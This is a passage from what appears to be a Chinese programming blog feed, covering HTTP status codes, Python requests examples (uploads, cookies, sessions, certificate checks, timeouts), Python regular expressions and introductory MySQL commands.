服务器不理解请求的语法。 </span><br><span class="line">401 （未授权） 请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。 </span><br><span class="line">403 （禁止） 服务器拒绝请求。 </span><br><span class="line">404 （未找到） 服务器找不到请求的网页。 </span><br><span class="line">405 （方法禁用） 禁用请求中指定的方法。 </span><br><span class="line">406 （不接受） 无法使用请求的内容特性响应请求的网页。 </span><br><span class="line">407 （需要代理授权） 此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。 </span><br><span class="line">408 （请求超时） 服务器等候请求时发生超时。 </span><br><span class="line">409 （冲突） 服务器在完成请求时发生冲突。服务器必须在响应中包含有关冲突的信息。 </span><br><span class="line">410 （已删除） 如果请求的资源已永久删除，服务器就会返回此响应。 </span><br><span class="line">411 （需要有效长度） 服务器不接受不含有效内容长度标头字段的请求。 </span><br><span class="line">412 （未满足前提条件） 服务器未满足请求者在请求中设置的其中一个前提条件。 </span><br><span class="line">413 （请求实体过大） 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。 </span><br><span class="line">414 （请求的 URI 过长） 请求的 URI（通常为网址）过长，服务器无法处理。 </span><br><span class="line">415 （不支持的媒体类型） 请求的格式不受请求页面的支持。 </span><br><span class="line">416 （请求范围不符合要求） 如果页面无法提供请求的范围，则服务器会返回此状态代码。 </span><br><span class="line">417 （未满足期望值） 服务器未满足”期望”请求标头字段的要求。</span><br><span class="line">5xx（服务器错误） </span><br><span class="line">这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。</span><br><span class="line">代码 说明 </span><br><span class="line">500 （服务器内部错误） 服务器遇到错误，无法完成请求。 </span><br><span class="line">501 （尚未实施） 服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码。 </span><br><span class="line">502 （错误网关） 服务器作为网关或代理，从上游服务器收到无效响应。 </span><br><span class="line">503 （服务不可用） 服务器目前无法使用（由于超载或停机维护）。通常，这只是暂时状态。 </span><br><span class="line">504 （网关超时） 服务器作为网关或代理，但是没有及时从上游服务器收到请求。 </span><br><span class="line">505 （HTTP 版本不受支持） 服务器不支持请求中所用的 HTTP 协议版本。</span><br><span class="line">HttpWatch状态码Result is</span><br><span class="line">200 - 服务器成功返回网页，客户端请求已成功。 </span><br><span class="line">302 - 对象临时移动。服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 </span><br><span class="line">304 - 属于重定向。自上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。 </span><br><span class="line">401 - 未授权。请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。 </span><br><span class="line">404 - 未找到。服务器找不到请求的网页。 </span><br><span class="line">2xx - 成功。表示服务器成功地接受了客户端请求。 </span><br><span class="line">3xx - 重定向。表示要完成请求，需要进一步操作。客户端浏览器必须采取更多操作来实现请求。例如，浏览器可能不得不请求服务器上的不同的页面，或通过代理服务器重复该请求。 </span><br><span class="line">4xx - 请求错误。这些状态代码表示请求可能出错，妨碍了服务器的处理。 </span><br><span class="line">5xx - 服务器错误。表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。</span><br></pre></td></tr></table></figure>

<h3 id="高级操作"><a href="#高级操作" class="headerlink" title="高级操作"></a>高级操作</h3><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入模块</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"># 以只读的方式打开图片</span><br><span class="line">&gt;&gt;&gt; files &#x3D; &#123;&#39;file&#39;:open(&#39;D:&#x2F;&#x2F;1580132124441.png&#39;,&#39;rb&#39;)&#125;</span><br><span class="line"># 选择要上传的网站</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,files &#x3D; files)</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入模块</span><br><span class="line">import requests</span><br><span class="line"># 请求接收baidu网址</span><br><span class="line">response &#x3D; requests.get(&quot;https:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line"># 打印cookies</span><br><span class="line">print(response.cookies)</span><br><span class="line"># 进行循环response.cookies.items项目，将key和value合并</span><br><span class="line">for key,value in response.cookies.items():</span><br><span class="line">	print(key + &#39;&#x3D;&#39; + value)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&lt;RequestsCookieJar[&lt;Cookie BDORZ&#x3D;27315 for .baidu.com&#x2F;&gt;]&gt;</span><br><span class="line">BDORZ&#x3D;27315</span><br></pre></td></tr></table></figure>

<h4 id="会话维持"><a href="#会话维持" class="headerlink" title="会话维持"></a>会话维持</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">模拟登录</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入模块</span><br><span class="line">import requests</span><br><span class="line"># 用requests中的Session()对象</span><br><span class="line">s&#x3D; requests.Session()</span><br><span class="line">s.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#x2F;set&#x2F;number&#x2F;123546465&#39;)</span><br><span class="line">response &#x3D; s.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="证书验证"><a href="#证书验证" class="headerlink" title="证书验证"></a>证书验证</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">#如果证书不存在会报错</span><br><span class="line">response &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.12306.cn&#39;)</span><br><span class="line">print(response.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 将verify设置为False之后就会打印状态码，但还是会提示最好验证证书</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">response &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.12306.cn&#39;,verify &#x3D; False)</span><br><span class="line">print(response.status_code)</span><br></pre></td></tr></table></figure>

<h4 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580206554561.png" alt="1580203818631"></p>
<h4 id="超时设置"><a href="#超时设置" class="headerlink" title="超时设置"></a>超时设置</h4><h5 id="限制服务器应答速度"><a href="#限制服务器应答速度" class="headerlink" title="限制服务器应答速度"></a>限制服务器应答速度</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.taobao.com&#39;,timeout &#x3D; 1 )</span><br><span class="line">print(response.status_code)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580206474221.png" alt="1580206474221"></p>
<h4 id="认证设置"><a href="#认证设置" class="headerlink" title="认证设置"></a>认证设置</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580203818631.png" alt="1580206554561"></p>
<h4 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580223155421.png" alt="1580206689321"></p>
<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h5 id="正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。-非python独有，re模块实现"><a href="#正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。-非python独有，re模块实现" class="headerlink" title="正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。    非python独有，re模块实现"></a>正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。    非python独有，re模块实现</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580276050159.png" alt="1580276050159"></p>
<h4 id="re-match"><a href="#re-match" class="headerlink" title="re.match"></a>re.match</h4><h5 id="re-match-尝试从字符串的起始位置匹配一个模式，如果不是从起始位置匹配成功的话，match-就返回none"><a href="#re-match-尝试从字符串的起始位置匹配一个模式，如果不是从起始位置匹配成功的话，match-就返回none" class="headerlink" title="re.match 尝试从字符串的起始位置匹配一个模式，如果不是从起始位置匹配成功的话，match()就返回none."></a>re.match 尝试从字符串的起始位置匹配一个模式，如果不是从起始位置匹配成功的话，match()就返回none.</h5><h5 id="最常规的匹配"><a href="#最常规的匹配" class="headerlink" title="最常规的匹配"></a>最常规的匹配</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入 re 模块</span><br><span class="line">&gt;&gt;&gt; import re</span><br><span class="line"># 将字符串赋值给变量content</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;Hello 123 4567 Whord_this is a regex demo&#39;</span><br><span class="line"># 将匹配结果赋值给result变量</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;^Hello\s\d&#123;3&#125;\s\d&#123;4&#125;\s\w&#123;10&#125;.*demo$&quot;,content)</span><br><span class="line"># 打印result变量</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line"># span表示打印的字符长度</span><br><span class="line">&lt;re.Match object; span&#x3D;(0, 41), match&#x3D;&#39;Hello 123 4567 Whord_this is a regex demo&#39;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="泛匹配"><a href="#泛匹配" class="headerlink" title="泛匹配"></a>泛匹配</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;Hello 123 4567 Whord_this is a regex demo&#39;</span><br><span class="line"># 将以Hello开头，demo$结尾中间的字符全都打印了出来</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;^Hello.*demo$&quot;,content)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">&lt;re.Match object; span&#x3D;(0, 41), match&#x3D;&#39;Hello 123 4567 Whord_this is a regex demo&#39;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="匹配目标"><a href="#匹配目标" class="headerlink" title="匹配目标"></a>匹配目标</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;Hello 1234567 Whord_this is a regex demo&#39;</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;^Hello\s(\d+)\sWhord.*demo$&quot;,content)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">&lt;re.Match object; span&#x3D;(0, 40), match&#x3D;&#39;Hello 1234567 Whord_this is a regex demo&#39;&gt;</span><br><span class="line"></span><br><span class="line">#如果正则表达式出现小括号，第一个小括号的内容就是group(1) </span><br><span class="line">&gt;&gt;&gt; print(result.group(1))</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>

<h5 id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="贪婪匹配"></a>贪婪匹配</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.*贪婪匹配，尽可能多的匹配，因为其中有一个\d+最少要有一个数字，所以只打印了7</span><br><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;Hello 1234567 Whord_this is a regex demo&#39;</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;^He.*(\d+).*demo$&quot;,content)</span><br><span class="line">&gt;&gt;&gt; print(result.group(1))</span><br><span class="line">7</span><br></pre></td></tr></table></figure>

<h5 id="非贪婪匹配"><a href="#非贪婪匹配" class="headerlink" title="非贪婪匹配"></a>非贪婪匹配</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.*?非贪婪匹配，尽可能少的匹配，看到括号里的\d这个数字了，就停止匹配，这样.*?就只匹配了Hello和空格</span><br><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;Hello 1234567 Whord_this is a regex demo&#39;</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;^He.*?(\d+).*demo$&quot;,content)</span><br><span class="line">&gt;&gt;&gt; print(result.group(1))</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>

<h5 id="匹配模式"><a href="#匹配模式" class="headerlink" title="匹配模式"></a>匹配模式</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;&#39;&#39;Hello 1234567 Whord_this</span><br><span class="line">is a regex demo</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">#re.S就是表示&quot;.&quot;但是这个&quot;.&quot;可以匹配换行符，如果不加re.S的话会报错因为平时的&quot;.&quot;除了换行符，可以匹配任意字符</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;^He.*?(\d+).*?demo$&quot;,content,re.S)</span><br><span class="line">&gt;&gt;&gt; print(result.group(1))</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>

<h5 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;price is $5.00&#39;</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;price is \$5\.00&quot;,content)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">&lt;re.Match object; span&#x3D;(0, 14), match&#x3D;&#39;price is $5.00&#39;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;price is \$5.00&quot;,content)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">&lt;re.Match object; span&#x3D;(0, 14), match&#x3D;&#39;price is $5.00&#39;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="总结-尽量使用泛匹配、使用括号得到匹配目标、尽量使用非贪婪模式、有换行符就用re-S"><a href="#总结-尽量使用泛匹配、使用括号得到匹配目标、尽量使用非贪婪模式、有换行符就用re-S" class="headerlink" title="总结:尽量使用泛匹配、使用括号得到匹配目标、尽量使用非贪婪模式、有换行符就用re.S"></a>总结:尽量使用泛匹配、使用括号得到匹配目标、尽量使用非贪婪模式、有换行符就用re.S</h5><h4 id="re-search方法"><a href="#re-search方法" class="headerlink" title="re.search方法"></a>re.search方法</h4><h5 id="re-search-扫描整个字符串并返回第一个成功的匹配"><a href="#re-search-扫描整个字符串并返回第一个成功的匹配" class="headerlink" title="re.search 扫描整个字符串并返回第一个成功的匹配"></a>re.search 扫描整个字符串并返回第一个成功的匹配</h5><h5 id="re-match-方法是要从其实位置匹配，如果匹配的不是起始位置那么就会返回None"><a href="#re-match-方法是要从其实位置匹配，如果匹配的不是起始位置那么就会返回None" class="headerlink" title="re.match 方法是要从其实位置匹配，如果匹配的不是起始位置那么就会返回None"></a>re.match 方法是要从其实位置匹配，如果匹配的不是起始位置那么就会返回None</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里需要使用re.search方法</span><br><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;most recent call last&#39;</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;most recent 1235648 call last demo&#39;</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.search(&quot;recent.*?(\d+).*?last&quot;,content)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">&lt;re.Match object; span&#x3D;(5, 29), match&#x3D;&#39;recent 1235648 call last&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; print(result.group(1))</span><br><span class="line">1235648</span><br></pre></td></tr></table></figure>

<h5 id="总结：为了匹配方便，能用search就不用match"><a href="#总结：为了匹配方便，能用search就不用match" class="headerlink" title="总结：为了匹配方便，能用search就不用match"></a>总结：为了匹配方便，能用search就不用match</h5><h4 id="re-findall方法"><a href="#re-findall方法" class="headerlink" title="re.findall方法"></a>re.findall方法</h4><h5 id="搜索字符串，以列表的形式返回全部能匹配的字串"><a href="#搜索字符串，以列表的形式返回全部能匹配的字串" class="headerlink" title="搜索字符串，以列表的形式返回全部能匹配的字串"></a>搜索字符串，以列表的形式返回全部能匹配的字串</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580223107107.png" alt="1580223107107"></p>
<h5 id="用findall方法将全部歌名打印出来"><a href="#用findall方法将全部歌名打印出来" class="headerlink" title="用findall方法将全部歌名打印出来"></a>用findall方法将全部歌名打印出来</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580206689321.png" alt="1580223155421"></p>
<h4 id="re-sub"><a href="#re-sub" class="headerlink" title="re.sub"></a>re.sub</h4><h5 id="替换字符串中每一个匹配的子串后返回替换后的字符串"><a href="#替换字符串中每一个匹配的子串后返回替换后的字符串" class="headerlink" title="替换字符串中每一个匹配的子串后返回替换后的字符串"></a>替换字符串中每一个匹配的子串后返回替换后的字符串</h5><h5 id="用sub去掉a打印li中的-歌名"><a href="#用sub去掉a打印li中的-歌名" class="headerlink" title="用sub去掉a打印li中的 歌名"></a>用sub去掉a打印li中的 歌名</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580229349011.png" alt="1580229349011"></p>
<h4 id="re-compile"><a href="#re-compile" class="headerlink" title="re.compile"></a>re.compile</h4><h5 id="将正则字符串编译成正则表达式对象"><a href="#将正则字符串编译成正则表达式对象" class="headerlink" title="将正则字符串编译成正则表达式对象"></a>将正则字符串编译成正则表达式对象</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将一个正则表达式串编译成正则对象，以便于复用该匹配模式</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入re模块</span><br><span class="line">&gt;&gt;&gt; import re</span><br><span class="line"># 建立一个字符串赋值给content</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;&#39;&#39;Hello 1234567 Whord_this</span><br><span class="line">is a regex demo</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"># 进行字符串编译成对象，用match方法从开头搜索</span><br><span class="line">&gt;&gt;&gt; pattern &#x3D; re.compile(&quot;Hello.*?demo&quot;,re.S)</span><br><span class="line"># 可以直接调用pattern变量，就不需要在括号里再打一遍代码</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(pattern,content)</span><br><span class="line"># 打印</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">&lt;re.Match object; span&#x3D;(0, 40), match&#x3D;&#39;Hello 1234567 Whord_this\nis a regex demo&#39;&gt;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>MySQL数据库</title>
    <url>/2020/04/03/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<h3 id="MySQL数据库优点"><a href="#MySQL数据库优点" class="headerlink" title="MySQL数据库优点"></a>MySQL数据库优点</h3><ul>
<li><h5 id="持久化数据到本地"><a href="#持久化数据到本地" class="headerlink" title="持久化数据到本地"></a>持久化数据到本地</h5></li>
<li><h5 id="可以实现结构化查询，方便管理"><a href="#可以实现结构化查询，方便管理" class="headerlink" title="可以实现结构化查询，方便管理"></a>可以实现结构化查询，方便管理</h5></li>
<li><h5 id="成本低：开源，免费使用"><a href="#成本低：开源，免费使用" class="headerlink" title="成本低：开源，免费使用"></a>成本低：开源，免费使用</h5></li>
<li><h5 id="性能高：移植性好"><a href="#性能高：移植性好" class="headerlink" title="性能高：移植性好"></a>性能高：移植性好</h5></li>
<li><h5 id="体积小便于安装"><a href="#体积小便于安装" class="headerlink" title="体积小便于安装"></a>体积小便于安装</h5></li>
</ul>
<h3 id="数据的概念"><a href="#数据的概念" class="headerlink" title="数据的概念"></a>数据的概念</h3><ul>
<li><strong>DB</strong><ul>
<li><strong>数据库(database)</strong>：存储数据的<strong>“仓库”</strong>。它<strong>保存了一系列有组织的数据。</strong></li>
</ul>
</li>
<li><strong>DBMS</strong><ul>
<li><strong>数据管理系统(Database Management System)</strong>。数据库是<strong>通过DBMS创建和操作的容器，又被称为数据</strong></li>
<li><strong>数据库管理系统-DBMS</strong>用于 <strong>检索数据、插入数据、更新数据、删除数据</strong></li>
</ul>
</li>
<li><strong>SQL</strong><ul>
<li><strong>结构化查询语言(Structure Query Language)</strong>：<strong>专门用来与数据库通信的语言</strong></li>
</ul>
</li>
</ul>
<h5 id="SQL的优点："><a href="#SQL的优点：" class="headerlink" title="SQL的优点："></a>SQL的优点：</h5><h5 id="1、不是某个特定数据库供应商应有的语言，几乎所有DBMS都支持SQL"><a href="#1、不是某个特定数据库供应商应有的语言，几乎所有DBMS都支持SQL" class="headerlink" title="1、不是某个特定数据库供应商应有的语言，几乎所有DBMS都支持SQL"></a>1、不是某个特定数据库供应商应有的语言，几乎所有DBMS都支持SQL</h5><h5 id="2、简单易学"><a href="#2、简单易学" class="headerlink" title="2、简单易学"></a>2、简单易学</h5><h5 id="3、虽然简单，但实际上是一种强有力的语言，灵活使用其他语言元素，可以进行非常复杂和高级的数据库操作"><a href="#3、虽然简单，但实际上是一种强有力的语言，灵活使用其他语言元素，可以进行非常复杂和高级的数据库操作" class="headerlink" title="3、虽然简单，但实际上是一种强有力的语言，灵活使用其他语言元素，可以进行非常复杂和高级的数据库操作"></a>3、虽然简单，但实际上是一种强有力的语言，灵活使用其他语言元素，可以进行非常复杂和高级的数据库操作</h5><h3 id="数据库存储数据的特点"><a href="#数据库存储数据的特点" class="headerlink" title="数据库存储数据的特点"></a>数据库存储数据的特点</h3><h5 id="1、将数据放到表中，表再放到库中"><a href="#1、将数据放到表中，表再放到库中" class="headerlink" title="1、将数据放到表中，表再放到库中"></a>1、将数据放到表中，表再放到库中</h5><h5 id="2、一个数据库中可与有多个表，每个表都有一个名字，用来标识自己的。表明具有唯一性。"><a href="#2、一个数据库中可与有多个表，每个表都有一个名字，用来标识自己的。表明具有唯一性。" class="headerlink" title="2、一个数据库中可与有多个表，每个表都有一个名字，用来标识自己的。表明具有唯一性。"></a>2、一个数据库中可与有多个表，每个表都有一个名字，用来标识自己的。表明具有唯一性。</h5><h5 id="3、表具有一些特性，这些特性定义了数据再表中如何存储，类似java中”类”的设计。"><a href="#3、表具有一些特性，这些特性定义了数据再表中如何存储，类似java中”类”的设计。" class="headerlink" title="3、表具有一些特性，这些特性定义了数据再表中如何存储，类似java中”类”的设计。"></a>3、表具有一些特性，这些特性定义了数据再表中如何存储，类似java中”类”的设计。</h5><h5 id="4、-表由列组成，我们也成为字段。所有表都是由一个或多个列组成的，每一列类似java中的”属性”"><a href="#4、-表由列组成，我们也成为字段。所有表都是由一个或多个列组成的，每一列类似java中的”属性”" class="headerlink" title="4、 表由列组成，我们也成为字段。所有表都是由一个或多个列组成的，每一列类似java中的”属性”"></a>4、 表由列组成，我们也成为字段。所有表都是由一个或多个列组成的，每一列类似java中的”属性”</h5><h5 id="5、表中的数据是按行存储的，每一行类似于java中的”对象”。"><a href="#5、表中的数据是按行存储的，每一行类似于java中的”对象”。" class="headerlink" title="5、表中的数据是按行存储的，每一行类似于java中的”对象”。"></a>5、表中的数据是按行存储的，每一行类似于java中的”对象”。</h5><h3 id="常见数据库管理系统"><a href="#常见数据库管理系统" class="headerlink" title="常见数据库管理系统"></a>常见数据库管理系统</h3><p>MySQL、Oracle、db2、SQL server</p>
<h3 id="登录和退出MySQL"><a href="#登录和退出MySQL" class="headerlink" title="登录和退出MySQL"></a>登录和退出MySQL</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">登录指令</span><br><span class="line">mysql -h localhost -P 3306 -u root -p</span><br><span class="line">登录指令简写</span><br><span class="line">mysql -u root -p</span><br><span class="line"></span><br><span class="line">退出指令</span><br><span class="line">exit	或者	ctrl+c</span><br></pre></td></tr></table></figure>

<h3 id="MySQL的常见命令"><a href="#MySQL的常见命令" class="headerlink" title="MySQL的常见命令"></a>MySQL的常见命令</h3><h5 id="其中，mysql、information-schema、performance-schema这三个库是不能随便动的"><a href="#其中，mysql、information-schema、performance-schema这三个库是不能随便动的" class="headerlink" title="其中，mysql、information_schema、performance_schema这三个库是不能随便动的"></a>其中，mysql、information_schema、performance_schema这三个库是不能随便动的</h5><ul>
<li><h5 id="mysql（用于保存用户信息的）"><a href="#mysql（用于保存用户信息的）" class="headerlink" title="mysql（用于保存用户信息的）"></a>mysql（用于保存用户信息的）</h5></li>
<li><h5 id="information-schema（用于保存原数据信息）"><a href="#information-schema（用于保存原数据信息）" class="headerlink" title="information_schema（用于保存原数据信息）"></a>information_schema（用于保存原数据信息）</h5></li>
<li><h5 id="performance-schema（用于搜集性能信息，性能参数）"><a href="#performance-schema（用于搜集性能信息，性能参数）" class="headerlink" title="performance_schema（用于搜集性能信息，性能参数）"></a>performance_schema（用于搜集性能信息，性能参数）</h5></li>
<li><p>test（表示测试数据库，这个库里面是空的，没有表，可以在里面去新建表，可以修改库删除库）</p>
</li>
</ul>
<h5 id="每条命令结尾都要加分号-（非常重要）"><a href="#每条命令结尾都要加分号-（非常重要）" class="headerlink" title="每条命令结尾都要加分号;（非常重要）"></a>每条命令结尾都要加分号;（非常重要）</h5><h5 id="插入sql文件，也就是插入数据库"><a href="#插入sql文件，也就是插入数据库" class="headerlink" title="插入sql文件，也就是插入数据库"></a>插入sql文件，也就是插入数据库</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; source sql文件位置</span><br></pre></td></tr></table></figure>

<h5 id="查看当前所有数据库"><a href="#查看当前所有数据库" class="headerlink" title="查看当前所有数据库"></a>查看当前所有数据库</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<h5 id="进入库的指令是"><a href="#进入库的指令是" class="headerlink" title="进入库的指令是"></a>进入库的指令是</h5><h5 id="use-库名；"><a href="#use-库名；" class="headerlink" title="use 库名；"></a>use 库名；</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#use 后面加上指定库名，这里进入的就是test库，结尾不要忘记加分号;</span><br><span class="line">mysql&gt; use test;</span><br><span class="line">Database changed	#返回一个database changed表示打开了test库</span><br></pre></td></tr></table></figure>

<h5 id="查看库中的表"><a href="#查看库中的表" class="headerlink" title="查看库中的表"></a>查看库中的表</h5><h5 id="show-tables；"><a href="#show-tables；" class="headerlink" title="show tables；"></a>show tables；</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查看当前库中的表用 show tables</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">Empty set (0.00 sec)	#返回结果empty set 表示空的</span><br></pre></td></tr></table></figure>

<h5 id="查看其他库的所有表"><a href="#查看其他库的所有表" class="headerlink" title="查看其他库的所有表"></a>查看其他库的所有表</h5><h5 id="show-tables-from-库名；"><a href="#show-tables-from-库名；" class="headerlink" title="show tables from 库名；"></a>show tables from 库名；</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#这样也可以查看其他库的表</span><br><span class="line">mysql&gt; show tables from mysql;</span><br></pre></td></tr></table></figure>

<h5 id="声明：如果用use进入当前库之后，再用show-tables-from来查看其他库的内容，虽然显示了其他库的表，但是位置还是在use进入的库里"><a href="#声明：如果用use进入当前库之后，再用show-tables-from来查看其他库的内容，虽然显示了其他库的表，但是位置还是在use进入的库里" class="headerlink" title="声明：如果用use进入当前库之后，再用show tables from来查看其他库的内容，虽然显示了其他库的表，但是位置还是在use进入的库里"></a>声明：如果用use进入当前库之后，再用show tables from来查看其他库的内容，虽然显示了其他库的表，但是位置还是在use进入的库里</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#这里use先进入的test库，虽然用show tables from查看了其他库的表，但是位置还是再test里面</span><br><span class="line">例如:</span><br><span class="line">mysql&gt; use test;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables from mysql;</span><br><span class="line">		库里面表的内容</span><br></pre></td></tr></table></figure>

<h5 id="查看所在的库"><a href="#查看所在的库" class="headerlink" title="查看所在的库"></a>查看所在的库</h5><h5 id="select-database"><a href="#select-database" class="headerlink" title="select database();"></a>select database();</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| test       |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="新建数据库"><a href="#新建数据库" class="headerlink" title="新建数据库"></a>新建数据库</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; create database 库名;</span><br></pre></td></tr></table></figure>

<h5 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop database 库名;</span><br></pre></td></tr></table></figure>

